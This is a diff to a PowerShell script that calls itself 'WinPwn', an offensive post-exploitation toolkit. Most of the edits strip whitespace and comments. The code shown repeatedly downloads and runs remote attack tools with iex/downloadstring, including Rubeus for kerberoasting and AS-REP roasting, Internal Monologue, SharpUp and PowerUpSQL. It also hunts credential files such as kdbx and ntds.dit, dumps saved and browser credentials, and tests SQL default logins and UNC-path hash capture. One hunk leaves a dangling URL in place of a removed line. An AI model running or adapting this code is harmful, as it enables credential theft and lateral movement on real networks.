@@ -1,23 +1,18 @@
-
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
             if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" >> "C:\sh_adm_mtrx\seatbelt\seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" }
- 
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPackerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
             if(!$consoleoutput){
                 Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\ASreproasting.txt" 
-                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\Kerberoasting_Rubeus.txt"
-               
+                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\Kerberoasting_Rubeus.txt"   
             }
             else
             {
                 Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
                 Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
             }
-
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
             if(!$consoleoutput){
-                Invoke-watson >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns.txt
-                
+                Invoke-watson >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns.txt     
             }
             else
             {
@@ -31,8 +26,7 @@
             else
             {
                 Invoke-Sharpweb -command "all"
-            }
-            
+            }     
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
             if (isadmin)
             {
@@ -44,12 +38,10 @@
             }
 
             if (isadmin)
-            {
-                
+            {               
                 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                 if(!$consoleoutput){
-                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> C:\sh_adm_mtrx\Internalmonologue.txt
-                    
+                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> C:\sh_adm_mtrx\Internalmonologue.txt                    
                 }
                 else
                 {
@@ -60,18 +52,15 @@
              {
 
             return
-        }
-        
+        }    
         do
         {
-
 function isadmin
 {
     # Check if Elevated
     $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
     return $isAdmin
 }
-
 function SessionGopher 
 {
      param(
@@ -92,8 +81,7 @@ function SessionGopher
             
 	        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
-            {
-              
+            {              
                 if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "C:\sh_adm_mtrx\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
             }
             else 
@@ -126,7 +114,6 @@ function SessionGopher
         Invoke-S3ssionGoph3r -Thorough
     }
 }
-
 function Kittielocal 
 {
     param(
@@ -204,14 +191,10 @@ function Kittielocal
         } 
         return
     }
-      
-
 }
-
 function Localreconmodules
 {
-<#
-        
+<#        
     #>
     #Local Reconning
     [CmdletBinding()]
@@ -220,21 +203,16 @@ function Localreconmodules
         $consoleoutput,
         [Switch]
         $noninteractive   
-    )
-         
-      
-            
+    )                    
     if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName   
     if ($noninteractive -and (!$consoleoutput))
     {
         generalrecon -noninteractive
         powershellsensitive -noninteractive
         browserpwn -noninteractive
         dotnet -noninteractive
-        passhunt -local $true -noninteractive
-        
+        passhunt -local $true -noninteractive        
         sensitivefiles -noninteractive
         return;
     }
@@ -243,33 +221,26 @@ function Localreconmodules
         generalrecon -noninteractive -consoleoutput
         powershellsensitive -noninteractive -consoleoutput
         browserpwn -noninteractive -consoleoutput
-        dotnet -noninteractive -consoleoutput 
-        
+        dotnet -noninteractive -consoleoutput         
         sensitivefiles -noninteractive -consoleoutput
         return;    
     }
     
     do
-    {
-        
+    {        
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
-
         Switch ($masterquestion) 
         {
              1{generalrecon}
              2{powershellsensitive}
-             3{browserpwn}
-             
-             5{passhunt -local $true}
-             
-             7{sensitivefiles}
-             8{morerecon}
-             
+             3{browserpwn}             
+             4{passhunt -local $true}             
+             5{sensitivefiles}
+             6{morerecon}             
        }
     }
- While ($masterquestion -ne 10)
+ While ($masterquestion -ne 7)
 }
-
 function Generalrecon{
     Param (
     [Switch]
@@ -324,8 +295,7 @@ function Generalrecon{
             	    ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
             	    }
         	        catch{$output = $output +   "`nFailed to read more files`r`n"}
-            }
-	    
+            }	    
 	        {
         	    try 
 		        {
@@ -430,7 +400,6 @@ function Generalrecon{
         Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'
         if(!$consoleoutput){cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 }
-
 function Morerecon{
     Param (
 [Switch]
@@ -441,17 +410,12 @@ $noninteractive
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if (isadmin)
-    {
-        
-        # P0wersploits local recon function
-        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
-    
-        Write-Host -ForegroundColor Yellow '-------> Dumping general computer information '
+    {        
+('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
+            Write-Host -ForegroundColor Yellow '-------> Dumping general computer information '
         if(!$consoleoutput){Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"}else{Get-ComputerDetails}
-
     }
 }
-
 function Sensitivefiles{
     Param (
     [Switch]
@@ -468,10 +432,8 @@ function Sensitivefiles{
         try{Find-InterestingFile -Path 'C:\' >> "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
         try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup >> "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
         Write-Verbose "Enumerating more interesting files..."
-
         $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
         $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
-
         $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
         GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
     }
@@ -481,15 +443,12 @@ function Sensitivefiles{
         try{Find-InterestingFile -Path 'C:\'}catch{Write-Host ":-("}
         try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup }catch{Write-Host ":-("}
         Write-Verbose "Enumerating more interesting files..."
-
         $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
         $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
-
         $IndexedFiles |Format-List |Out-String -width 500 
         GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 
     }
 }
-
 function Browserpwn{
     Param (
    [Switch]
@@ -539,12 +498,7 @@ function Browserpwn{
 }
 
 {
-        Write-Host "================ WinPwn ================"
-        Write-Host -ForegroundColor Green '1. Passhunt search for Powerview found shares!'
-        Write-Host -ForegroundColor Green '2. Run Snaffler! '
-        
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
-
         Switch ($masterquestion) 
         {
              1{passhunt -domain $true}
@@ -556,10 +510,8 @@ function Browserpwn{
 }
 
 function Snaffler
-{
-    
+{    
     [CmdletBinding()]
-
     Param
     (   
         [Switch]
@@ -568,8 +520,7 @@ function Snaffler
         $consoleoutput
     )
     if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName    
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Snaffler.ps1')
     if (!$noninteractive)
     {
@@ -594,7 +545,6 @@ function Snaffler
 function oxidresolver
 {
     [CmdletBinding()]
-
     Param
     (
         [Switch]
@@ -606,9 +556,7 @@ function oxidresolver
     if(!$consoleoutput){pathcheck}
     if(!$consoleoutput){Invoke-Oxidresolver >> "$currentPath\DomainRecon\OxidBindings.txt"}
     else{Invoke-Oxidresolver}
-
-}
-                   
+}                   
 function reconAD
 {
     [CmdletBinding()]
@@ -618,7 +566,6 @@ function reconAD
         [Switch]
         $consoleoutput   
     )
-
     # sense-of-security - ADRecon
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -628,17 +575,8 @@ function reconAD
     Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
     cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
-
-
 function PowerSQL
 {
-<#
-        .DESCRIPTION
-        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction. Original Scipt from https://github.com/NetSPI/
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
-    #Domain Recon / Lateral Movement Phase
     [CmdletBinding()]
     Param (
         [Switch]
@@ -648,21 +586,14 @@ function PowerSQL
     )
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-
     Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/PowerUpSQL.ps1')
-    if(!$consoleoutput){Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"}
-    
-    Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
+    if(!$consoleoutput){Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"}      
     $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
     if(!$consoleoutput){$Targets >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible SQL Servers';$Targets}
-    if(!$consoleoutput){$Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible Instances';$Targets.Instance}
-    
-    Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
-    if(!$consoleoutput){Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\Vulnerabilities\SQLServer_DefaultLogin.txt"}else{Write-Host -ForegroundColor Yellow '-------> Default Logins';Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose}
-    
-    Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
-    foreach ($line in $Targets.Instance)
+    if(!$consoleoutput){$Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible Instances';$Targets.Instance}       
+    if(!$consoleoutput){Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\Vulnerabilities\SQLServer_DefaultLogin.txt"}else{Write-Host -ForegroundColor Yellow '-------> Default Logins';Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose}  
+        foreach ($line in $Targets.Instance)
     {
         if(!$consoleoutput){
             Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
@@ -674,19 +605,15 @@ function PowerSQL
             $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
         }
         else
-        {
-            Write-Host -ForegroundColor Yellow '-------> SQL Login Info'
+        {    
             Get-SQLServerInfo -Verbose -Instance $line
             Invoke-SQLDumpInfo -Verbose -Instance $line
-	        $SQLComputerName = $Targets.Computername
-            Write-Host -ForegroundColor Yellow '-------> SQL Audit'
+	        $SQLComputerName = $Targets.Computername    
             Invoke-SQLAudit -Verbose -Instance $line 
-            Write-Host -ForegroundColor Yellow '-------> Potential Lateral Movement over LinkCrawl'
-	        Get-SQLServerLinkCrawl -verbose -instance "$line"
+               Get-SQLServerLinkCrawl -verbose -instance "$line"
         }
     }
     if(!$consoleoutput){
-        Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
         move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
         $uncpath = "no"
         if (!$noninteractive){$uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'}
@@ -706,32 +633,17 @@ function PowerSQL
             }    
         }
     }
-    #TODO Else Exploit Function
-    # XP_Cmdshell functions follow - maybe.
-	      
+          
 }
 
 function Get-currentIP
-{
-<#
-        .DESCRIPTION
-        Gets the current active IP-Address configuration.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
+{      
     #Domain Recon / Lateral Movement Phase
     $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
     return $IPaddress
 }
-
 function Sharphound
 {
-<#
-        .DESCRIPTION
-        Downloads Sharphound.exe and collects All AD-Information for Bloodhound https://github.com/BloodHoundAD
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
     #Domain Recon / Lateral Movement Phase
     Param (
         [Switch]
